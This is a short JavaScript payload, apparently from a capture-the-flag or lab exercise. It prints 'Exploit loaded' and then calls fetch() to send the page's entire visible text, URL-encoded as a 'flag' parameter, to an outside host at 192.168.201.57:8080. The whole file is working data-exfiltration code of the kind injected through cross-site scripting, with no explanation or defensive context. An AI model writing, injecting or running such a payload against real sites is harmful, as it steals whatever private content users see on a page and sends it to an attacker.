console.log("Exploit loaded");
fetch("http://192.168.201.57:8080/?flag=" + encodeURIComponent(document.body.innerText));
